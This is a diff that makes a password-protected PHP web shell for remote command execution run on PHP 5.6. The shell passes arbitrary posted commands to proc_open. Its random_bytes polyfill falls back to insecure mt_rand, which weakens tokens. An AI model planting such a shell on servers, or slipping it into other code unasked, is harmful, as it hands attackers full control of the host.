@@ -7,12 +7,87 @@ ini_set('display_errors', 0);
 /**
  * WebShell - Secure Remote Command Execution
  * Password authentication via SHA256 (config/password.php)
+ * Tương thích PHP 5.6+
  */
 
+// --- Polyfill / helpers cho PHP cũ ---
+if (!defined('PHP_OS_FAMILY')) {
+    $__os = strtoupper(substr(PHP_OS, 0, 3));
+    if ($__os === 'WIN') {
+        define('PHP_OS_FAMILY', 'Windows');
+    } elseif ($__os === 'LIN') {
+        define('PHP_OS_FAMILY', 'Linux');
+    } elseif ($__os === 'DAR') {
+        define('PHP_OS_FAMILY', 'Darwin');
+    } else {
+        define('PHP_OS_FAMILY', 'Unknown');
+    }
+    unset($__os);
+}
+
+if (!function_exists('hash_equals')) {
+    function hash_equals($known_string, $user_string)
+    {
+        if (!is_string($known_string) || !is_string($user_string)) {
+            return false;
+        }
+        $len = strlen($known_string);
+        if ($len !== strlen($user_string)) {
+            return false;
+        }
+        $result = 0;
+        for ($i = 0; $i < $len; $i++) {
+            $result |= ord($known_string[$i]) ^ ord($user_string[$i]);
+        }
+        return $result === 0;
+    }
+}
+
+if (!function_exists('random_bytes')) {
+    function random_bytes($length)
+    {
+        $length = (int) $length;
+        if ($length < 1) {
+            return false;
+        }
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $strong = false;
+            $bytes = openssl_random_pseudo_bytes($length, $strong);
+            if ($bytes !== false && $strong) {
+                return $bytes;
+            }
+        }
+        if (function_exists('mcrypt_create_iv') && defined('MCRYPT_DEV_URANDOM')) {
+            $bytes = mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
+            if ($bytes !== false) {
+                return $bytes;
+            }
+        }
+        $bytes = '';
+        for ($i = 0; $i < $length; $i++) {
+            $bytes .= chr(mt_rand(0, 255));
+        }
+        return $bytes;
+    }
+}
+
+/** getenv() không đối số chỉ có từ PHP 7.1+ */
+function wsh_getenv_all()
+{
+    if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70100) {
+        $env = @getenv();
+        return is_array($env) ? $env : array();
+    }
+    if (!empty($_ENV) && is_array($_ENV)) {
+        return $_ENV;
+    }
+    return is_array($_SERVER) ? $_SERVER : array();
+}
+
 // Load cấu hình
-$config_file = __DIR__ . '/config/password.php';
+$config_file = dirname(__FILE__) . '/config/password.php';
 if (!file_exists($config_file)) {
-    die('<h2 style="color:red;font-family:monospace">⚠ Lỗi: Không tìm thấy file config/password.php</h2>');
+    die('<h2 style="color:red;font-family:monospace">Loi: Khong tim thay file config/password.php</h2>');
 }
 require_once $config_file;
 
@@ -26,19 +101,26 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
 // header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
 
 // --- Bảo mật Session ---
-ini_set('session.use_strict_mode', 1);
-ini_set('session.cookie_httponly', 1);
-ini_set('session.cookie_samesite', 'Strict');
+if (version_compare(PHP_VERSION, '5.5.2', '>=')) {
+    @ini_set('session.use_strict_mode', '1');
+}
+ini_set('session.cookie_httponly', '1');
+// cookie_samesite chỉ hỗ trợ từ PHP 7.3+
+if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70300) {
+    ini_set('session.cookie_samesite', 'Strict');
+}
 // Bật cookie_secure khi dùng HTTPS
-// ini_set('session.cookie_secure', 1);
+// ini_set('session.cookie_secure', '1');
 session_name(SESSION_NAME);
 session_start();
 
 // --- Kiểm tra IP Whitelist ---
 function check_ip_whitelist()
 {
-    if (empty(IP_WHITELIST)) return true;
-    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    if (!defined('IP_WHITELIST') || empty(IP_WHITELIST)) {
+        return true;
+    }
+    $client_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
     return in_array($client_ip, IP_WHITELIST, true);
 }
 
@@ -46,9 +128,12 @@ function check_ip_whitelist()
 function get_attempts_data()
 {
     $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
-    if (!file_exists($file)) return ['count' => 0, 'last_attempt' => 0, 'locked_until' => 0];
+    $defaults = array('count' => 0, 'last_attempt' => 0, 'locked_until' => 0);
+    if (!file_exists($file)) {
+        return $defaults;
+    }
     $data = json_decode(file_get_contents($file), true);
-    return $data ?? ['count' => 0, 'last_attempt' => 0, 'locked_until' => 0];
+    return is_array($data) ? $data : $defaults;
 }
 
 function save_attempts_data($data)
@@ -60,12 +145,18 @@ function save_attempts_data($data)
 function reset_attempts()
 {
     $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
-    if (file_exists($file)) unlink($file);
+    if (file_exists($file)) {
+        unlink($file);
+    }
 }
 
 // Kiểm tra IP
 if (!check_ip_whitelist()) {
-    http_response_code(403);
+    if (function_exists('http_response_code')) {
+        http_response_code(403);
+    } else {
+        header('HTTP/1.1 403 Forbidden');
+    }
     die('403 Forbidden');
 }
 
@@ -77,16 +168,16 @@ $lock_remaining = 0;
 $attempts = get_attempts_data();
 $now = time();
 
-if ($attempts['locked_until'] > $now) {
+if (isset($attempts['locked_until']) && $attempts['locked_until'] > $now) {
     $login_locked = true;
     $lock_remaining = $attempts['locked_until'] - $now;
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
+if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
 
     // Đăng xuất
     if ($_POST['action'] === 'logout') {
-        $_SESSION = [];
+        $_SESSION = array();
         session_destroy();
         header('Location: ' . $_SERVER['PHP_SELF']);
         exit;
@@ -94,7 +185,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
 
     // Đăng nhập
     if ($_POST['action'] === 'login' && !$login_locked) {
-        $password = $_POST['password'] ?? '';
+        $password = isset($_POST['password']) ? $_POST['password'] : '';
         $hashed = hash('sha256', $password);
         if (hash_equals(SHELL_PASSWORD_HASH, $hashed)) {
             reset_attempts();
@@ -105,6 +196,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
             header('Location: ' . $_SERVER['PHP_SELF']);
             exit;
         } else {
+            if (!isset($attempts['count'])) {
+                $attempts['count'] = 0;
+            }
             $attempts['count']++;
             $attempts['last_attempt'] = $now;
             if ($attempts['count'] >= MAX_FAILED_ATTEMPTS) {
@@ -124,8 +218,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
 // --- Kiểm tra phiên ---
 $authenticated = false;
 if (!empty($_SESSION['authenticated'])) {
-    if (($now - ($_SESSION['last_activity'] ?? 0)) > SESSION_TIMEOUT) {
-        $_SESSION = [];
+    $last_activity = isset($_SESSION['last_activity']) ? (int) $_SESSION['last_activity'] : 0;
+    if (($now - $last_activity) > SESSION_TIMEOUT) {
+        $_SESSION = array();
         session_destroy();
         $error_msg = 'Phiên đã hết hạn. Vui lòng đăng nhập lại.';
     } else {
@@ -135,16 +230,19 @@ if (!empty($_SESSION['authenticated'])) {
 }
 
 // --- Thực thi lệnh (AJAX) ---
-if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'exec') {
+if ($authenticated && isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'exec') {
     header('Content-Type: application/json; charset=utf-8');
     // CSRF check
-    if (!hash_equals($_SESSION['token'] ?? '', $_POST['token'] ?? '')) {
-        echo json_encode(['error' => 'Invalid CSRF token']);
+    $session_token = isset($_SESSION['token']) ? $_SESSION['token'] : '';
+    $post_token = isset($_POST['token']) ? $_POST['token'] : '';
+    if (!hash_equals($session_token, $post_token)) {
+        echo json_encode(array('error' => 'Invalid CSRF token'));
         exit;
     }
-    $cmd = $_POST['cmd'] ?? '';
-    if (empty(trim($cmd))) {
-        echo json_encode(['output' => '', 'cwd' => getcwd()]);
+    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
+    $cmd_trim = trim($cmd);
+    if ($cmd_trim === '') {
+        echo json_encode(array('output' => '', 'cwd' => getcwd()));
         exit;
     }
     // Khôi phục thư mục làm việc trước khi xử lý lệnh và cd
@@ -154,14 +252,20 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
     // Xử lý lệnh cd
     if (preg_match('/^\s*cd\s+(.*)/i', $cmd, $matches)) {
         $dir = trim($matches[1]);
-        if (empty($dir) || $dir === '~') {
-            $dir = PHP_OS_FAMILY === 'Windows' ? (getenv('USERPROFILE') ?: 'C:\\') : (getenv('HOME') ?: '/');
+        if ($dir === '' || $dir === '~') {
+            if (PHP_OS_FAMILY === 'Windows') {
+                $home = getenv('USERPROFILE');
+                $dir = ($home !== false && $home !== '') ? $home : 'C:\\';
+            } else {
+                $home = getenv('HOME');
+                $dir = ($home !== false && $home !== '') ? $home : '/';
+            }
         }
-        if (chdir($dir)) {
+        if (@chdir($dir)) {
             $_SESSION['cwd'] = getcwd();
-            echo json_encode(['output' => '', 'cwd' => getcwd()]);
+            echo json_encode(array('output' => '', 'cwd' => getcwd()));
         } else {
-            echo json_encode(['output' => "cd: Không tìm thấy thư mục: $dir\r\n", 'cwd' => getcwd()]);
+            echo json_encode(array('output' => "cd: Không tìm thấy thư mục: $dir\r\n", 'cwd' => getcwd()));
         }
         exit;
     }
@@ -169,13 +273,17 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
     // Thực thi lệnh
     $output = '';
     if (function_exists('proc_open')) {
-        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+        $descriptorspec = array(
+            0 => array('pipe', 'r'),
+            1 => array('pipe', 'w'),
+            2 => array('pipe', 'w'),
+        );
         $env = null;
         if (PHP_OS_FAMILY === 'Windows') {
-            $env = array_merge(getenv() ?: [], [
+            $env = array_merge(wsh_getenv_all(), array(
                 'PYTHONUTF8' => '1',
                 'PYTHONIOENCODING' => 'utf-8',
-            ]);
+            ));
             $cmd = 'chcp 65001 >nul && ' . $cmd;
         }
         $proc = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
@@ -186,7 +294,8 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
             fclose($pipes[1]);
             fclose($pipes[2]);
             proc_close($proc);
-            if (!empty($stderr) && empty(trim($output))) {
+            $out_trim = trim($output);
+            if (!empty($stderr) && $out_trim === '') {
                 $output = $stderr;
             } elseif (!empty($stderr)) {
                 $output .= $stderr;
@@ -195,24 +304,30 @@ if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act
     } else {
         $output = "[Lỗi] Không thể thực thi lệnh: proc_open đã bị vô hiệu hóa.";
     }
-    echo json_encode(['output' => $output ?? '', 'cwd' => getcwd()], JSON_UNESCAPED_UNICODE);
+    if ($output === null || $output === false) {
+        $output = '';
+    }
+    $json_flags = defined('JSON_UNESCAPED_UNICODE') ? JSON_UNESCAPED_UNICODE : 0;
+    echo json_encode(array('output' => $output, 'cwd' => getcwd()), $json_flags);
     exit;
 }
 
 // --- Thông tin hệ thống ---
-$sys_info = [];
+$sys_info = array();
 if ($authenticated) {
-    $sys_info = [
+    $sys_info = array(
         'os'   => PHP_OS_FAMILY . ' (' . php_uname('m') . ')',
         'php'  => PHP_VERSION,
         'user' => function_exists('get_current_user') ? get_current_user() : 'unknown',
         'cwd'  => getcwd(),
-        'ip'   => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+        'ip'   => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown',
         'time' => date('Y-m-d H:i:s'),
-    ];
-    if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
+    );
+    if (!isset($_SESSION['cwd'])) {
+        $_SESSION['cwd'] = getcwd();
+    }
 }
-$token = $authenticated ? ($_SESSION['token'] ?? '') : '';
+$token = ($authenticated && isset($_SESSION['token'])) ? $_SESSION['token'] : '';
 ?>
 <!DOCTYPE html>
 <html lang="vi">
